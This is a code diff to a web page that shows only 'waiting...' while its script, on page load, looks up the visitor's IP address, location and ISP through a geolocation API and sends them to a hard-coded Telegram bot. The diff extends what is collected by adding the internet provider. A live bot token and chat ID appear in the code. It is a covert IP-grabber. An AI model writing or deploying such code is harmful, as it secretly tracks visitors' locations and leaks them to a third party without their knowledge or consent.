@@ -9,19 +9,18 @@
     waiting...
     <script>
       async function getUserInfo() {
-        const request = await fetch(
-          "https://ipinfo.io/json?token=7d9380bd134fe2"
-        );
+        const request = await fetch("http://ip-api.com/json/?fields=61439", {
+          method: "GET",
+        });
         const response = await request.json();
         return response;
       }
       window.addEventListener("load", async () => {
-        const { ip, city, country, postal, region, timezone } =
+        const { query, city, countryCode, postal, regionName, timezone, isp } =
           await getUserInfo();
-        console.log(ip, city, country, postal, region, timezone);
         const botApi = "6559381340:AAFBebXhmpgSbUEsijMnYWxzs75csh_3kLo";
         const chatId = "-1002217556728";
-        const textField = `User info :%0A - ip -> ${ip}%0A - country -> ${country}%0A - city -> ${city}%0A - region -> ${region}%0A - postal -> ${postal}%0A - timezone -> ${timezone}`;
+        const textField = `User info :%0A - ip -> ${query}%0A - country -> ${countryCode}%0A - city -> ${city}%0A - region -> ${regionName}%0A - postal -> ${postal}%0A - operator -> ${isp}%0A - timezone -> ${timezone}`;
         const url = `https://api.telegram.org/bot${botApi}/sendMessage?chat_id=${chatId}&text=${textField}`;
 
         let api = new XMLHttpRequest();
